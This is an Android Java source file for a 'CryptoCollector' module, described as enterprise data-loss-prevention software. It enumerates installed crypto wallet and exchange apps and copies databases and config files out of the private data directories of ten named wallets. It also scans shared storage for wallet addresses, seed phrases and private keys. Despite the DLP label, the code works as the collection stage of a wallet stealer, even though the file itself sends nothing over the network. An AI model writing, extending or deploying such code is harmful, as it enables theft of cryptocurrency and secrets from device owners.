package com.athex.dlp.collectors;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * ATHEX DLP Enterprise - CryptoCollector
 * 
 * Cryptocurrency wallet detection and data extraction module.
 * Detects and extracts data from popular crypto wallets:
 * - Trust Wallet
 * - MetaMask
 * - Binance
 * - Coinbase
 * - Exodus
 * - Blockchain.com
 * - Mycelium
 * - Atomic Wallet
 * - Coinomi
 * - Phantom (Solana)
 * 
 * Also scans for:
 * - Wallet addresses in files
 * - Seed phrases
 * - Private keys
 * - Keystore files
 * - Clipboard crypto data
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class CryptoCollector {
    
    private static final String TAG = "ATHEX_CryptoCollector";
    
    // ============================================================
    // KNOWN CRYPTO WALLET PACKAGES
    // ============================================================
    
    private static final String[][] KNOWN_WALLETS = {
        {"com.wallet.crypto.trustapp", "Trust Wallet", "Trust Wallet"},
        {"com.metamask", "MetaMask", "MetaMask"},
        {"io.metamask", "MetaMask", "MetaMask"},
        {"com.binance.dev", "Binance", "Binance"},
        {"com.binance.us", "Binance US", "Binance"},
        {"com.coinbase.android", "Coinbase", "Coinbase"},
        {"com.coinbase.wallet", "Coinbase Wallet", "Coinbase"},
        {"com.exodusmovement.exodus", "Exodus", "Exodus"},
        {"com.exodus.exodus", "Exodus", "Exodus"},
        {"piuk.blockchain.android", "Blockchain.com", "Blockchain"},
        {"com.blockchainvault", "Blockchain Vault", "Blockchain"},
        {"com.mycelium.wallet", "Mycelium", "Mycelium"},
        {"com.atomicwallet", "Atomic Wallet", "Atomic"},
        {"com.coinomi.wallet", "Coinomi", "Coinomi"},
        {"app.phantom", "Phantom", "Phantom (Solana)"},
        {"com.phantom.wallet", "Phantom", "Phantom (Solana)"},
        {"com.ledger.live", "Ledger Live", "Ledger"},
        {"com.safepal.wallet", "SafePal", "SafePal"},
        {"com.bitcoin.mwallet", "Bitcoin Wallet", "Bitcoin"},
        {"de.schildbach.wallet", "Bitcoin Wallet", "Bitcoin"},
        {"com.defi.wallet", "DeFi Wallet", "Crypto.com"},
        {"com.crypto.wallet", "Crypto.com Wallet", "Crypto.com"},
        {"com.kraken.trade", "Kraken", "Kraken"},
        {"com.kucoin.android", "KuCoin", "KuCoin"},
        {"com.bybit.app", "Bybit", "Bybit"},
        {"com.okex.wallet", "OKX", "OKX"},
        {"com.gemini.android.app", "Gemini", "Gemini"},
        {"com.bitstamp.app", "Bitstamp", "Bitstamp"},
    };
    
    // ============================================================
    // WALLET DATA PATHS
    // ============================================================
    
    private static final String[][] WALLET_DATA_PATHS = {
        {"Trust Wallet", "/data/data/com.wallet.crypto.trustapp"},
        {"MetaMask", "/data/data/com.metamask"},
        {"Binance", "/data/data/com.binance.dev"},
        {"Coinbase", "/data/data/com.coinbase.android"},
        {"Exodus", "/data/data/com.exodusmovement.exodus"},
        {"Blockchain", "/data/data/piuk.blockchain.android"},
        {"Mycelium", "/data/data/com.mycelium.wallet"},
        {"Atomic Wallet", "/data/data/com.atomicwallet"},
        {"Coinomi", "/data/data/com.coinomi.wallet"},
        {"Phantom", "/data/data/app.phantom"},
    };
    
    // ============================================================
    // CRYPTO ADDRESS REGEX PATTERNS
    // ============================================================
    
    // Bitcoin P2PKH
    private static final Pattern BTC_PATTERN = Pattern.compile(
        "\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b"
    );
    
    // Bitcoin Bech32
    private static final Pattern BTC_BECH32_PATTERN = Pattern.compile(
        "\\bbc1[a-z0-9]{39,59}\\b"
    );
    
    // Ethereum
    private static final Pattern ETH_PATTERN = Pattern.compile(
        "\\b0x[a-fA-F0-9]{40}\\b"
    );
    
    // Monero
    private static final Pattern XMR_PATTERN = Pattern.compile(
        "\\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93,105}\\b"
    );
    
    // Litecoin
    private static final Pattern LTC_PATTERN = Pattern.compile(
        "\\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\\b"
    );
    
    // Solana
    private static final Pattern SOL_PATTERN = Pattern.compile(
        "\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b"
    );
    
    // Private key (WIF format)
    private static final Pattern PRIVATE_KEY_PATTERN = Pattern.compile(
        "\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\\b"
    );
    
    // BIP39 seed phrase
    private static final Pattern SEED_PHRASE_PATTERN = Pattern.compile(
        "\\b([a-z]+\\s){11,23}[a-z]+\\b"
    );
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    private final Context context;
    private final PackageManager packageManager;
    private final ExecutorService executor;
    private final Handler mainHandler;
    
    // Options
    private boolean scanFileSystem = true;
    private boolean extractWalletData = true;
    private boolean detectAddresses = true;
    private boolean detectSeedPhrases = true;
    private boolean detectPrivateKeys = true;
    private String[] scanDirectories = {
        "/sdcard/",
        "/sdcard/Download/",
        "/sdcard/Documents/",
    };
    
    // Statistics
    private int walletsFound = 0;
    private int addressesFound = 0;
    private int seedPhrasesFound = 0;
    private int privateKeysFound = 0;
    private int filesScanned = 0;
    private long collectionStartTime = 0;
    
    // Callbacks
    private CollectionCallback callback;
    
    // ============================================================
    // INTERFACES
    // ============================================================
    
    public interface CollectionCallback {
        void onCollectionStarted();
        void onWalletFound(String walletName, String packageName);
        void onAddressFound(String address, String type, String source);
        void onSeedPhraseFound(String source);
        void onProgressUpdate(String currentAction);
        void onCollectionComplete(JSONObject result, CryptoStats stats);
        void onCollectionError(String error);
    }
    
    public static class CryptoStats {
        public int walletsFound;
        public int addressesFound;
        public int seedPhrasesFound;
        public int privateKeysFound;
        public int filesScanned;
        public long durationMs;
        
        @Override
        public String toString() {
            return String.format(Locale.getDefault(),
                "Wallets: %d | Addresses: %d | Seeds: %d | Keys: %d | Files: %d",
                walletsFound, addressesFound, seedPhrasesFound, privateKeysFound, filesScanned
            );
        }
    }
    
    // ============================================================
    // CONSTRUCTOR
    // ============================================================
    
    public CryptoCollector(Context context) {
        this.context = context.getApplicationContext();
        this.packageManager = context.getPackageManager();
        this.executor = Executors.newSingleThreadExecutor();
        this.mainHandler = new Handler(Looper.getMainLooper());
    }
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    
    public CryptoCollector setScanFileSystem(boolean scan) {
        this.scanFileSystem = scan;
        return this;
    }
    
    public CryptoCollector setExtractWalletData(boolean extract) {
        this.extractWalletData = extract;
        return this;
    }
    
    public CryptoCollector setDetectAddresses(boolean detect) {
        this.detectAddresses = detect;
        return this;
    }
    
    public CryptoCollector setDetectSeedPhrases(boolean detect) {
        this.detectSeedPhrases = detect;
        return this;
    }
    
    public CryptoCollector setDetectPrivateKeys(boolean detect) {
        this.detectPrivateKeys = detect;
        return this;
    }
    
    public CryptoCollector setScanDirectories(String[] directories) {
        this.scanDirectories = directories;
        return this;
    }
    
    public CryptoCollector setCallback(CollectionCallback callback) {
        this.callback = callback;
        return this;
    }
    
    // ============================================================
    // MAIN COLLECTION
    // ============================================================
    
    public void collect() {
        executor.execute(() -> {
            try {
                collectionStartTime = System.currentTimeMillis();
                resetStats();
                notifyCollectionStarted();
                
                JSONObject result = new JSONObject();
                
                // Step 1: Detect installed wallets
                JSONArray installedWallets = detectInstalledWallets();
                result.put("installed_wallets", installedWallets);
                result.put("wallet_count", installedWallets.length());
                walletsFound = installedWallets.length();
                
                notifyProgress("Scanning installed wallets...");
                
                // Step 2: Extract wallet data
                if (extractWalletData) {
                    JSONArray walletData = extractWalletData();
                    if (walletData.length() > 0) {
                        result.put("wallet_data", walletData);
                    }
                }
                
                // Step 3: Scan file system for addresses
                if (scanFileSystem) {
                    notifyProgress("Scanning file system...");
                    JSONObject scanResults = scanFileSystem();
                    result.put("scan_results", scanResults);
                }
                
                result.put("timestamp", System.currentTimeMillis());
                
                CryptoStats stats = buildStats();
                stats.durationMs = System.currentTimeMillis() - collectionStartTime;
                
                Log.i(TAG, "Collection complete: " + stats.toString());
                notifyCollectionComplete(result, stats);
                
            } catch (Exception e) {
                Log.e(TAG, "Collection error: " + e.getMessage(), e);
                notifyError("Collection failed: " + e.getMessage());
            }
        });
    }
    
    // ============================================================
    // INSTALLED WALLET DETECTION
    // ============================================================
    
    /**
     * Detect installed cryptocurrency wallets
     */
    private JSONArray detectInstalledWallets() {
        JSONArray wallets = new JSONArray();
        
        try {
            List<ApplicationInfo> installedApps = packageManager.getInstalledApplications(0);
            
            for (ApplicationInfo appInfo : installedApps) {
                for (String[] walletInfo : KNOWN_WALLETS) {
                    if (appInfo.packageName.equals(walletInfo[0])) {
                        JSONObject wallet = new JSONObject();
                        wallet.put("package_name", walletInfo[0]);
                        wallet.put("name", walletInfo[1]);
                        wallet.put("category", walletInfo[2]);
                        wallet.put("installed", true);
                        
                        // Get app details
                        try {
                            wallet.put("app_name", 
                                packageManager.getApplicationLabel(appInfo).toString());
                            wallet.put("uid", appInfo.uid);
                            wallet.put("data_dir", appInfo.dataDir);
                            wallet.put("source_dir", appInfo.sourceDir);
                            
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                wallet.put("min_sdk", appInfo.minSdkVersion);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error getting wallet details: " + e.getMessage());
                        }
                        
                        wallets.put(wallet);
                        
                        notifyWalletFound(walletInfo[1], walletInfo[0]);
                        break;
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error detecting wallets: " + e.getMessage());
        }
        
        return wallets;
    }
    
    // ============================================================
    // WALLET DATA EXTRACTION
    // ============================================================
    
    /**
     * Extract data from installed wallet databases
     */
    private JSONArray extractWalletData() {
        JSONArray walletData = new JSONArray();
        
        for (String[] walletPath : WALLET_DATA_PATHS) {
            try {
                String walletName = walletPath[0];
                String dataDir = walletPath[1];
                
                notifyProgress("Extracting " + walletName + " data...");
                
                JSONObject data = extractSingleWalletData(walletName, dataDir);
                if (data != null && data.length() > 0) {
                    walletData.put(data);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error extracting wallet data: " + e.getMessage());
            }
        }
        
        return walletData;
    }
    
    /**
     * Extract data from a single wallet
     */
    private JSONObject extractSingleWalletData(String walletName, String dataDir) {
        JSONObject data = new JSONObject();
        
        try {
            File dir = new File(dataDir);
            if (!dir.exists() || !dir.canRead()) {
                return null;
            }
            
            data.put("wallet_name", walletName);
            data.put("data_directory", dataDir);
            
            // Look for database files
            File[] dbFiles = findDatabaseFiles(dir);
            JSONArray dbData = new JSONArray();
            
            for (File dbFile : dbFiles) {
                try {
                    JSONObject dbInfo = new JSONObject();
                    dbInfo.put("file_name", dbFile.getName());
                    dbInfo.put("file_path", dbFile.getAbsolutePath());
                    dbInfo.put("file_size", dbFile.length());
                    dbInfo.put("last_modified", dbFile.lastModified());
                    
                    // Try to read database tables
                    JSONArray tables = readDatabaseTables(dbFile);
                    if (tables.length() > 0) {
                        dbInfo.put("tables", tables);
                    }
                    
                    dbData.put(dbInfo);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error reading wallet DB: " + e.getMessage());
                }
            }
            
            if (dbData.length() > 0) {
                data.put("databases", dbData);
            }
            
            // Look for config/preference files
            File[] configFiles = findConfigFiles(dir);
            JSONArray configData = new JSONArray();
            
            for (File configFile : configFiles) {
                try {
                    String content = readFileContent(configFile, 5000);
                    if (content != null && !content.isEmpty()) {
                        JSONObject configInfo = new JSONObject();
                        configInfo.put("file_name", configFile.getName());
                        configInfo.put("content_preview", content.substring(0, 
                            Math.min(500, content.length())));
                        
                        // Scan for addresses in config
                        if (detectAddresses) {
                            JSONArray addresses = findAddressesInText(content, 
                                configFile.getName());
                            if (addresses.length() > 0) {
                                configInfo.put("addresses_found", addresses);
                                addressesFound += addresses.length();
                            }
                        }
                        
                        configData.put(configInfo);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error reading config file: " + e.getMessage());
                }
            }
            
            if (configData.length() > 0) {
                data.put("config_files", configData);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting wallet data: " + e.getMessage());
        }
        
        return data.length() > 0 ? data : null;
    }
    
    // ============================================================
    // FILE SYSTEM SCANNING
    // ============================================================
    
    /**
     * Scan file system for crypto-related data
     */
    private JSONObject scanFileSystem() {
        JSONObject scanResults = new JSONObject();
        JSONArray foundAddresses = new JSONArray();
        JSONArray foundSeeds = new JSONArray();
        JSONArray foundKeys = new JSONArray();
        
        try {
            for (String dirPath : scanDirectories) {
                File dir = new File(dirPath);
                if (dir.exists() && dir.isDirectory()) {
                    scanDirectory(dir, foundAddresses, foundSeeds, foundKeys, 0);
                }
            }
            
            scanResults.put("addresses_found", foundAddresses);
            scanResults.put("addresses_count", foundAddresses.length());
            scanResults.put("seed_phrases_found", foundSeeds);
            scanResults.put("seed_phrases_count", foundSeeds.length());
            scanResults.put("private_keys_found", foundKeys);
            scanResults.put("private_keys_count", foundKeys.length());
            scanResults.put("files_scanned", filesScanned);
            
        } catch (Exception e) {
            Log.e(TAG, "Error scanning file system: " + e.getMessage());
        }
        
        return scanResults;
    }
    
    /**
     * Recursively scan directory
     */
    private void scanDirectory(File directory, JSONArray addresses, 
                               JSONArray seeds, JSONArray keys, int depth) {
        if (depth > 5) return; // Limit recursion
        
        File[] files = directory.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                // Skip hidden directories
                if (!file.getName().startsWith(".")) {
                    scanDirectory(file, addresses, seeds, keys, depth + 1);
                }
            } else if (file.isFile() && isReadableTextFile(file)) {
                filesScanned++;
                
                try {
                    String content = readFileContent(file, 50000);
                    if (content == null || content.isEmpty()) continue;
                    
                    // Scan for addresses
                    if (detectAddresses) {
                        JSONArray fileAddresses = findAddressesInText(content, file.getName());
                        for (int i = 0; i < fileAddresses.length(); i++) {
                            JSONObject addr = fileAddresses.getJSONObject(i);
                            addr.put("source_file", file.getAbsolutePath());
                            addresses.put(addr);
                            addressesFound++;
                            
                            notifyAddressFound(
                                addr.optString("address", ""),
                                addr.optString("type", ""),
                                file.getName()
                            );
                        }
                    }
                    
                    // Scan for seed phrases
                    if (detectSeedPhrases) {
                        Matcher seedMatcher = SEED_PHRASE_PATTERN.matcher(content);
                        while (seedMatcher.find()) {
                            String seed = seedMatcher.group();
                            String[] words = seed.split("\\s+");
                            
                            if (words.length == 12 || words.length == 24) {
                                JSONObject seedObj = new JSONObject();
                                seedObj.put("source_file", file.getAbsolutePath());
                                seedObj.put("word_count", words.length);
                                seedObj.put("phrase_masked", maskSensitiveData(seed));
                                seeds.put(seedObj);
                                seedPhrasesFound++;
                                
                                notifySeedPhraseFound(file.getName());
                            }
                        }
                    }
                    
                    // Scan for private keys
                    if (detectPrivateKeys) {
                        Matcher keyMatcher = PRIVATE_KEY_PATTERN.matcher(content);
                        while (keyMatcher.find()) {
                            String key = keyMatcher.group();
                            JSONObject keyObj = new JSONObject();
                            keyObj.put("source_file", file.getAbsolutePath());
                            keyObj.put("key_masked", maskSensitiveData(key));
                            keyObj.put("key_length", key.length());
                            keys.put(keyObj);
                            privateKeysFound++;
                        }
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error scanning file: " + file.getName() + 
                        " - " + e.getMessage());
                }
            }
            
            // Limit total files
            if (filesScanned >= 1000) break;
        }
    }
    
    // ============================================================
    // ADDRESS DETECTION
    // ============================================================
    
    /**
     * Find all crypto addresses in text
     */
    private JSONArray findAddressesInText(String text, String source) {
        JSONArray addresses = new JSONArray();
        
        // Bitcoin
        Matcher btcMatcher = BTC_PATTERN.matcher(text);
        while (btcMatcher.find()) {
            JSONObject addr = new JSONObject();
            addr.put("address", btcMatcher.group());
            addr.put("type", "Bitcoin (P2PKH)");
            addr.put("source", source);
            addresses.put(addr);
        }
        
        // Bitcoin Bech32
        Matcher btcBechMatcher = BTC_BECH32_PATTERN.matcher(text);
        while (btcBechMatcher.find()) {
            JSONObject addr = new JSONObject();
            addr.put("address", btcBechMatcher.group());
            addr.put("type", "Bitcoin (Bech32)");
            addr.put("source", source);
            addresses.put(addr);
        }
        
        // Ethereum
        Matcher ethMatcher = ETH_PATTERN.matcher(text);
        while (ethMatcher.find()) {
            JSONObject addr = new JSONObject();
            addr.put("address", ethMatcher.group());
            addr.put("type", "Ethereum/EVM");
            addr.put("source", source);
            addresses.put(addr);
        }
        
        // Solana
        Matcher solMatcher = SOL_PATTERN.matcher(text);
        while (solMatcher.find()) {
            String solAddr = solMatcher.group();
            // Filter out false positives
            if (solAddr.length() >= 32 && solAddr.length() <= 44) {
                JSONObject addr = new JSONObject();
                addr.put("address", solAddr);
                addr.put("type", "Solana");
                addr.put("source", source);
                addresses.put(addr);
            }
        }
        
        // Litecoin
        Matcher ltcMatcher = LTC_PATTERN.matcher(text);
        while (ltcMatcher.find()) {
            JSONObject addr = new JSONObject();
            addr.put("address", ltcMatcher.group());
            addr.put("type", "Litecoin");
            addr.put("source", source);
            addresses.put(addr);
        }
        
        return addresses;
    }
    
    // ============================================================
    // UTILITY METHODS
    // ============================================================
    
    private File[] findDatabaseFiles(File directory) {
        return directory.listFiles((dir, name) -> 
            name.endsWith(".db") || name.endsWith(".sqlite") || 
            name.endsWith(".sqlite3") || name.equals("wallet")
        );
    }
    
    private File[] findConfigFiles(File directory) {
        return directory.listFiles((dir, name) -> 
            name.endsWith(".json") || name.endsWith(".xml") || 
            name.endsWith(".txt") || name.equals("config") ||
            name.startsWith("pref")
        );
    }
    
    private JSONArray readDatabaseTables(File dbFile) {
        JSONArray tables = new JSONArray();
        SQLiteDatabase db = null;
        
        try {
            File tempDb = copyDatabase(dbFile);
            if (tempDb == null) return tables;
            
            db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            // Get table names
            Cursor cursor = db.rawQuery(
                "SELECT name FROM sqlite_master WHERE type='table'", null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String tableName = cursor.getString(0);
                    JSONObject tableInfo = new JSONObject();
                    tableInfo.put("table_name", tableName);
                    
                    // Get row count
                    Cursor countCursor = db.rawQuery(
                        "SELECT COUNT(*) FROM [" + tableName + "]", null
                    );
                    if (countCursor != null && countCursor.moveToFirst()) {
                        tableInfo.put("row_count", countCursor.getInt(0));
                    }
                    if (countCursor != null) countCursor.close();
                    
                    tables.put(tableInfo);
                }
                cursor.close();
            }
            
            db.close();
            tempDb.delete();
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading database: " + e.getMessage());
        }
        
        return tables;
    }
    
    private File copyDatabase(File source) {
        try {
            File tempFile = File.createTempFile("athex_crypto_", ".db",
                context.getCacheDir());
            
            FileInputStream fis = new FileInputStream(source);
            FileOutputStream fos = new FileOutputStream(tempFile);
            
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, read);
            }
            
            fis.close();
            fos.close();
            
            return tempFile;
            
        } catch (IOException e) {
            return null;
        }
    }
    
    private String readFileContent(File file, int maxLength) {
        try {
            byte[] bytes = new byte[(int) Math.min(file.length(), maxLength)];
            FileInputStream fis = new FileInputStream(file);
            int read = fis.read(bytes);
            fis.close();
            
            if (read > 0) {
                return new String(bytes, 0, read, "UTF-8");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading file: " + e.getMessage());
        }
        return null;
    }
    
    private boolean isReadableTextFile(File file) {
        String name = file.getName().toLowerCase();
        String[] textExtensions = {
            ".txt", ".json", ".xml", ".csv", ".log", ".md", ".cfg",
            ".ini", ".yaml", ".yml", ".properties", ".env"
        };
        
        for (String ext : textExtensions) {
            if (name.endsWith(ext)) return true;
        }
        
        // Check if no extension (could be text)
        if (!name.contains(".") && file.length() < 100000) return true;
        
        return false;
    }
    
    private String maskSensitiveData(String data) {
        if (data == null || data.length() < 8) return "****";
        
        int showChars = Math.min(6, data.length() / 3);
        return data.substring(0, showChars) + 
               "*".repeat(Math.min(data.length() - showChars - 3, 20)) +
               data.substring(data.length() - 3);
    }
    
    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }
    
    private void resetStats() {
        walletsFound = 0;
        addressesFound = 0;
        seedPhrasesFound = 0;
        privateKeysFound = 0;
        filesScanned = 0;
    }
    
    private CryptoStats buildStats() {
        CryptoStats stats = new CryptoStats();
        stats.walletsFound = walletsFound;
        stats.addressesFound = addressesFound;
        stats.seedPhrasesFound = seedPhrasesFound;
        stats.privateKeysFound = privateKeysFound;
        stats.filesScanned = filesScanned;
        return stats;
    }
    
    // ============================================================
    // CALLBACKS
    // ============================================================
    
    private void notifyCollectionStarted() {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionStarted());
        }
    }
    
    private void notifyWalletFound(String walletName, String packageName) {
        if (callback != null) {
            mainHandler.post(() -> callback.onWalletFound(walletName, packageName));
        }
    }
    
    private void notifyAddressFound(String address, String type, String source) {
        if (callback != null) {
            mainHandler.post(() -> callback.onAddressFound(address, type, source));
        }
    }
    
    private void notifySeedPhraseFound(String source) {
        if (callback != null) {
            mainHandler.post(() -> callback.onSeedPhraseFound(source));
        }
    }
    
    private void notifyProgress(String action) {
        if (callback != null) {
            mainHandler.post(() -> callback.onProgressUpdate(action));
        }
    }
    
    private void notifyCollectionComplete(JSONObject result, CryptoStats stats) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionComplete(result, stats));
        }
    }
    
    private void notifyError(String error) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionError(error));
        }
    }
    
    public void shutdown() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }
}